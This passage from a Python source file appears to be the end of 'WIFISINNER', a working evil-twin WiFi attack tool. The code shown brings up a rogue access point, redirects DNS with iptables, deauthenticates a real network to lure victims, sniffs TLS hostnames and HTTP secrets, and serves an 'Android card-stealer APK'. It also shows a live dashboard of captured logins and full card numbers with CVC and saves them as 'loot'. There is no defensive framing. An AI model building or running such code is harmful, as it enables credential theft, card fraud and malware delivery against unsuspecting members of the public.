            "802-11-wireless-security.proto", "rsn",
            "802-11-wireless-security.pairwise", "ccmp",
            "802-11-wireless-security.psk", password,
        ]
    r = run(cmd)
    if r.returncode != 0:
        print(r.stderr.strip())
        return False
    r = run(["nmcli", "connection", "up", ssid])
    if r.returncode != 0:
        print(r.stderr.strip())
        return False
    for _ in range(30):
        st = run(["nmcli", "-t", "-f", "GENERAL.STATE", "device", "show", iface]).stdout.strip()
        if "connected" in st:
            return True
        time.sleep(0.5)
    return False


def dns_hijack_enable(iface, gateway, port=5353):
    for proto in ("udp", "tcp"):
        run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface, "-p", proto, "--dport", "53", "-j", "DNAT", "--to-destination", f"{gateway}:{port}"])


def dns_hijack_disable(iface, gateway, port=5353):
    for proto in ("udp", "tcp"):
        run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", iface, "-p", proto, "--dport", "53", "-j", "DNAT", "--to-destination", f"{gateway}:{port}"])


def nm_leasefile(iface):
    return f"/var/lib/NetworkManager/dnsmasq-{iface}.leases"


# ------------------------------------------------------------- dashboard --

def human_bytes(n):
    for u in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.1f}{u}"
        n /= 1024
    return f"{n:.1f}TB"


def draw_line(ch="─", color=C_DIM):
    cols = shutil.get_terminal_size().columns
    return color + ch * cols + C_RESET


def render_dashboard():
    cols = shutil.get_terminal_size().columns
    out = []
    out.append("\x1b[2J\x1b[H")
    out.append(f"{C_BRED}{C_BOLD}  WIFISINNER v{VERSION}{C_RESET} {C_DIM}─ evil twin honeypot ─{C_RESET}\n")
    ap = S.ap_info
    out.append(f"{C_BCYAN}[AP]{C_RESET}      {C_WHITE}{ap.get('ssid','?')}{C_RESET} {C_DIM}|{C_RESET} iface {C_WHITE}{ap.get('iface','?')}{C_RESET} ch {C_WHITE}{ap.get('channel','?')}{C_RESET} {C_DIM}|{C_RESET} {C_GREEN}● UP{C_RESET} {C_DIM}|{C_RESET} ip {C_WHITE}{ap.get('ip','?')}{C_RESET} {C_DIM}|{C_RESET} sec {C_WHITE}{ap.get('security','open')}{C_RESET}\n")
    nat = S.nat_info
    nat_s = f"{C_GREEN}{nat.get('state')}{C_RESET} via {C_WHITE}{nat.get('uplink')}{C_RESET}" if nat.get("uplink") else f"{C_YELLOW}{nat.get('state','n/a')}{C_RESET}"
    out.append(f"{C_BCYAN}[NAT]{C_RESET}      {nat_s}\n")
    if S.deauth_info:
        out.append(f"{C_BCYAN}[DEAUTH]{C_RESET}   {C_BRED}hammering{C_RESET} {C_WHITE}{S.deauth_info['target']}{C_RESET} ({S.deauth_info['bssid']}) {C_DIM}|{C_RESET} frames sent: {C_WHITE}{S.deauth_info.get('sent',0)}{C_RESET}\n")
    out.append(f"{C_BCYAN}[TRAFFIC]{C_RESET} {C_WHITE}↓{human_bytes(S.rx_bytes)} ↑{human_bytes(S.tx_bytes)}{C_RESET} {C_DIM}|{C_RESET} pkts {C_WHITE}{S.packets}{C_RESET} {C_DIM}|{C_RESET} uptime {C_WHITE}{int(time.time()-S.start_time)}s{C_RESET}\n")
    out.append(draw_line())
    out.append(f"\n{C_BGREEN}{C_BOLD}[✦ CREDENTIALS CAPTURED: {len(S.creds)}]{C_RESET}\n")
    if S.creds:
        for c in S.creds[-8:]:
            out.append(f"  {C_BRED}▸{C_RESET} {C_BYELLOW}{c['provider']}{C_RESET}: {C_WHITE}{c['user']}{C_RESET} {C_BRED}/ {c['password']}{C_RESET} {C_DIM}({c['ip']} {c.get('os','?')}){C_RESET}\n")
    else:
        out.append(f"  {C_DIM}(none yet - victims must sign in on the portal){C_RESET}\n")
    out.append(f"\n{C_BYELLOW}{C_BOLD}[✦ CREDIT CARDS: {len(S.cards)}]{C_RESET}\n")
    if S.cards:
        for c in S.cards[-6:]:
            out.append(f"  {C_BYELLOW}▸{C_RESET} {C_WHITE}{c['brand']} ••••{c['number'][-4:]}{C_RESET} {c['exp']} {C_BYELLOW}{c['cvc']}{C_RESET} {C_DIM}({c['name']}, {c['ip']} {c.get('model','?')}){C_RESET}\n")
    else:
        out.append(f"  {C_DIM}(none yet - install FREE WIFI Helper on Android to harvest){C_RESET}\n")
    out.append(f"\n{C_BCYAN}[CLIENTS: {len(S.clients)}]{C_RESET}\n")
    for ip, c in list(S.clients.items())[:10]:
        if ip == "pending":
            continue
        auth = f"{C_GREEN}AUTHED{C_RESET}" if c.get("authed") else f"{C_YELLOW}portal{C_RESET}"
        out.append(f"  {C_WHITE}{ip:<14}{C_RESET} {C_CYAN}{c.get('mac','?'):<18}{C_RESET} {c.get('os','?'):<8} {auth} {C_DIM}{str(c.get('hostname','?'))[:20]}{C_RESET}\n")
    out.append(f"\n{C_BCYAN}[DNS QUERIES: {sum(S.dns.values())} ({len(S.dns)} unique)]{C_RESET} {C_BCYAN}[TLS HOSTS: {sum(S.sni.values())} ({len(S.sni)} unique)]{C_RESET} {C_BCYAN}[HTTP SECRETS: {len(S.http_creds)}]{C_RESET}\n")
    with S.lock:
        topd = S.dns.most_common(6)
        tops = S.sni.most_common(6)
    if topd:
        out.append("  " + " ".join(f"{C_WHITE}{d}{C_RESET}{C_DIM}×{n}{C_RESET}" for d, n in topd) + "\n")
    if tops:
        out.append(f"  {C_MAGENTA}TLS:{C_RESET} " + " ".join(f"{C_WHITE}{d}{C_RESET}{C_DIM}×{n}{C_RESET}" for d, n in tops) + "\n")
    out.append(draw_line())
    out.append(f"\n{C_BGREEN}{C_BOLD}[EVENT LOG]{C_RESET}\n")
    with S.lock:
        for t, msg, color in list(S.events)[-10:]:
            line = f"  {C_DIM}{t}{C_RESET} {color}{msg}{C_RESET}"
            out.append(line[: cols - 2] + "\n")
    out.append(f"\n{C_DIM}Ctrl+C to stop and save loot.{C_RESET}\n")
    sys.stdout.write("".join(out))
    sys.stdout.flush()


def dashboard_loop():
    while not STOP.is_set():
        try:
            render_dashboard()
        except Exception:
            pass
        STOP.wait(1.0)


# --------------------------------------------------------------- selftest --

def selftest():
    ok = True
    q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01"
    parsed = parse_dns_query(q)
    assert parsed and parsed[1] == "www.example.com" and parsed[2] == 1, "dns parse failed"
    resp = dns_synth_response(parsed[0], parsed[3], 1, "10.0.0.1")
    assert socket.inet_aton("10.0.0.1") in resp, "dns synth failed"
    print(f"{C_GREEN}[ok]{C_RESET} DNS query parser + synthesizer")
    def _mk_client_hello(name):
        entry = b"\x00" + struct.pack(">H", len(name)) + name
        sn_list = struct.pack(">H", len(entry)) + entry
        ext = b"\x00\x00" + struct.pack(">H", len(sn_list)) + sn_list
        body = b"\x03\x03" + b"\x11" * 32 + b"\x00" + struct.pack(">H", 2) + b"\x13\x01" + b"\x00" + struct.pack(">H", len(ext)) + ext
        hs = b"\x01" + len(body).to_bytes(3, "big") + body
        return b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs
    sni = parse_sni(_mk_client_hello(b"localhost"))
    assert sni == "localhost", f"sni parse failed: {sni}"
    assert parse_sni(b"\x17\x03\x03\x00\x10" + b"\xab" * 16) is None, "sni false positive"
    print(f"{C_GREEN}[ok]{C_RESET} TLS SNI parser")
    http = parse_http(b"POST /login HTTP/1.1\r\nHost: x.com\r\nAuthorization: Basic " + base64.b64encode(b"bob:hunter2") + b"\r\n\r\nuser=bob&password=hunter2")
    assert http and http["method"] == "POST" and http_is_interesting(http), "http parse failed"
    assert basic_auth_decode(http["headers"]["authorization"]) == "bob:hunter2", "basic auth decode failed"
    print(f"{C_GREEN}[ok]{C_RESET} HTTP parser + Basic Auth decode")
    assert detect_os("Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit") == "Android"
    assert detect_os("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)") == "iOS"
    print(f"{C_GREEN}[ok]{C_RESET} OS fingerprinter")
    assert card_brand("4111111111111111") == "VISA"
    assert card_brand("5500 0000 0000 0004") == "MASTERCARD"
    assert card_brand("371449635398431") == "AMEX"
    assert card_brand("6011111111111117") == "DISCOVER"
    print(f"{C_GREEN}[ok]{C_RESET} card brand detector")
    print(f"\n{C_BGREEN}All self-tests passed.{C_RESET}")
    return ok


# ------------------------------------------------------------------- main --

BANNER = f"""{C_BRED}
__        _____ _____ ___ ____ ___ _   _ _   _ _____ ____
\\ \\      / /_ _|  ___|_ _/ ___|_ _| \\ | | \\ | | ____|  _ \\
 \\ \\ /\\ / / | || |_   | |\\___ \\| ||  \\| |  \\| |  _| | |_) |
  \\ V  V /  | ||  _|  | | ___) | || |\\  | |\\  | |___|  _ <
   \\_/\\_/  |___|_|   |___|____/___|_| \\_|_| \\_|_____|_| \\_\\
{C_DIM}                   v{VERSION}  ── evil twin honeypot ──{C_RESET}
{C_RESET}"""


def main():
    p = argparse.ArgumentParser(description="WIFISINNER - evil twin WiFi honeypot")
    p.add_argument("--iface", help="wifi interface (default: auto-detect)")
    p.add_argument("--ssid", default="FREE WIFI", help="honeypot SSID (default: FREE WIFI)")
    p.add_argument("--channel", type=int, default=6, help="AP channel (default: 6)")
    p.add_argument("--password", help="WPA2 password (default: open network)")
    p.add_argument("--gateway", default="10.0.0.1", help="AP gateway IP (default: 10.0.0.1)")
    p.add_argument("--deauth", metavar="SSID", help="deauth-hammer a real network to lure victims")
    p.add_argument("--no-nat", action="store_true", help="don't share internet with victims")
    p.add_argument("--scan", action="store_true", help="list nearby networks and exit")
    p.add_argument("--selftest", action="store_true", help="run offline self-tests and exit")
    p.add_argument("--payload", metavar="APK", help="Android card-stealer APK to serve (default: payload/WIFISINNER.apk)")
    args = p.parse_args()

    signal.signal(signal.SIGTERM, lambda *_: (_ for _ in ()).throw(KeyboardInterrupt()))

    if args.selftest:
        sys.exit(0 if selftest() else 1)

    if os.geteuid() != 0:
        print(f"{C_RED}[!] run as root:  sudo python3 {sys.argv[0]}{C_RESET}")
        sys.exit(1)

    for tool in ("nmcli", "dnsmasq", "tcpdump", "sysctl"):
        if not which(tool):
            print(f"{C_RED}[!] required tool missing: {tool}{C_RESET}")
            sys.exit(1)

    print(BANNER)

    iface = args.iface or detect_wifi_iface()
    if not iface:
        print(f"{C_RED}[!] no wifi interface found{C_RESET}")
        sys.exit(1)
    print(f"{C_BCYAN}[*]{C_RESET} wifi interface: {C_WHITE}{iface}{C_RESET}")

    if not unblock_wifi():
        print(f"{C_RED}[!] could not bring {iface} up (rfkill/hardware){C_RESET}")
        print(f"{C_DIM}    rfkill: {run(['rfkill', 'list']).stdout.strip()}{C_RESET}")
        print(f"{C_DIM}    nm radio: {run(['nmcli', 'radio']).stdout.strip()}{C_RESET}")
        sys.exit(1)

    if args.scan:
        nets = scan_networks(iface)
        print(f"\n{C_BCYAN} nearby networks:{C_RESET}")
        for n in sorted(nets, key=lambda x: int(x["signal"] or 0), reverse=True):
            print(f"  {C_WHITE}{n['ssid']:<25}{C_RESET} ch{C_CYAN}{n['channel']:<3}{C_RESET} sig {n['signal']:<4} {n['security']}")
        sys.exit(0)

    channel = args.channel
    target = None
    if args.deauth:
        print(f"{C_BCYAN}[*]{C_RESET} scanning for target network {C_WHITE}{args.deauth}{C_RESET} ...")
        target = find_target(iface, args.deauth)
        if target:
            channel = target["channel"]
            print(f"{C_GREEN}[+]{C_RESET} target found: {target['bssid']} ch{channel} -> honeypot will share its channel")
        else:
            print(f"{C_YELLOW}[!] target not found - continuing without deauth{C_RESET}")

    loot_dir = Path("loot") / datetime.now().strftime("%Y%m%d_%H%M%S")
    loot_dir.mkdir(parents=True, exist_ok=True)

    apk = Path(args.payload) if args.payload else (Path(__file__).resolve().parent / "payload" / "WIFISINNER.apk")
    if apk and not apk.is_file():
        print(f"{C_YELLOW}[!] Android payload not found: {apk}{C_RESET}")
        apk = None
    if apk:
        print(f"{C_BCYAN}[*]{C_RESET} Android card-stealer APK armed: {C_WHITE}{apk}{C_RESET}")

    print(f"{C_BCYAN}[*]{C_RESET} creating honeypot {C_WHITE}'{args.ssid}'{C_RESET} on {iface} ch{channel} ({'WPA2' if args.password else 'open'}) ...")
    if not create_ap(iface, args.ssid, channel, args.password, args.gateway):
        print(f"{C_RED}[!] failed to start access point{C_RESET}")
        sys.exit(1)
    S.ap_info = {"ssid": args.ssid, "iface": iface, "channel": channel, "ip": args.gateway, "security": "WPA2" if args.password else "open"}
    print(f"{C_GREEN}[+]{C_RESET} access point is UP")

    uplink = None if args.no_nat else detect_uplink()
    nat_enable(iface, uplink)

    dns_hijack_enable(iface, args.gateway)
    dns_sock = start_dns(args.gateway, port=5353)
    portal = start_portal(args.gateway, 80, loot_dir, apk=apk)
    start_sniffer(iface)
    start_lease_poller(nm_leasefile(iface))
    try:
        pcap = subprocess.Popen(["tcpdump", "-i", iface, "-U", "-w", str(loot_dir / "full_capture.pcap")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        pcap = None
    print(f"{C_GREEN}[+]{C_RESET} DHCP (NM shared) / DNS hijack / captive portal / sniffers / pcap running")
    print(f"{C_BCYAN}[*]{C_RESET} loot directory: {C_WHITE}{loot_dir.resolve()}{C_RESET}")
    S.event(f"honeypot '{args.ssid}' armed on {iface} ch{channel}", C_BGREEN)

    deauth = None
    if args.deauth and target:
        deauth = start_deauth(iface, target["bssid"], target["ssid"])
        if deauth:
            S.event(f"deauth hammering {target['ssid']} ({target['bssid']})", C_BRED)

    tcpdump_ok = pcap is not None and pcap.poll() is None

    def finish():
        STOP.set()
        time.sleep(0.3)
        dns_hijack_disable(iface, args.gateway)
        if pcap is not None:
            try:
                pcap.terminate()
                pcap.wait(timeout=3)
            except Exception:
                pass
        try:
            dns_sock.close()
        except Exception:
            pass
        if deauth:
            run(["ip", "link", "set", "mon0", "down"])
            run(["iw", "dev", "mon0", "del"])
        run(["nmcli", "connection", "delete", args.ssid])
        nat_disable(iface, uplink)
        save_loot(loot_dir / "clients.json", {k: v for k, v in S.clients.items() if k != "pending"})
        save_loot(loot_dir / "dns_queries.json", dict(S.dns))
        save_loot(loot_dir / "tls_hosts.json", dict(S.sni))
        if S.cards:
            save_loot(loot_dir / "cards.json", list(S.cards))
        lines = [f"WIFISINNER session {ts()}", f"ssid={args.ssid} iface={iface} ch={channel} uplink={uplink}", ""]
        lines.append(f"CREDENTIALS CAPTURED: {len(S.creds)}")
        for c in S.creds:
            lines.append(f"  [{c['time']}] {c['provider']} | {c['user']} / {c['password']} | {c['ip']} ({c.get('os','?')})")
        lines.append("")
        lines.append(f"CREDIT CARDS CAPTURED: {len(S.cards)}")
        for c in S.cards:
            lines.append(f"  [{c['time']}] {c['brand']} {c['number']} {c['exp']} {c['cvc']} | {c['name']} | {c['ip']} {c.get('model','?')}")
        lines.append("")
        lines.append(f"clients: {len(S.clients)}  dns queries: {sum(S.dns.values())}  tls hosts: {len(S.sni)}  http secrets: {len(S.http_creds)}")
        (loot_dir / "session_summary.txt").write_text("\n".join(lines) + "\n")
        return loot_dir

    try:
        while True:
            render_dashboard()
            time.sleep(1.0)
            if pcap is not None and pcap.poll() is not None and tcpdump_ok:
                tcpdump_ok = False
                S.event("tcpdump exited - pcap capture stopped", C_YELLOW)
    except KeyboardInterrupt:
        print(f"\n{C_BCYAN}[*]{C_RESET} shutting down...")
        loot = finish()
        print(f"\n{C_BGREEN}[✓]{C_RESET} loot saved: {C_WHITE}{loot.resolve()}{C_RESET}")
        if S.cards:
            print(f"{C_BYELLOW}{C_BOLD}  STOLEN CREDIT CARDS:{C_RESET}")
            for c in S.cards:
                print(f"   {C_BYELLOW}▸{C_RESET} {C_WHITE}{c['brand']} {c['number']}{C_RESET} {c['exp']} {C_BYELLOW}{c['cvc']}{C_RESET}  {C_DIM}({c['name']}, {c['ip']} {c.get('model','?')}){C_RESET}")
        if S.creds:
            print(f"{C_BRED}{C_BOLD}  STOLEN CREDENTIALS:{C_RESET}")
            for c in S.creds:
                print(f"   {C_BRED}▸{C_RESET} {c['provider']}: {C_BYELLOW}{c['user']}{C_RESET} {C_BRED}/{C_RESET} {C_BRED}{c['password']}{C_RESET}  {C_DIM}({c['ip']}, {c.get('os','?')}){C_RESET}")
        else:
            print(f"{C_DIM}no credentials captured this run{C_RESET}")


if __name__ == "__main__":
    main()
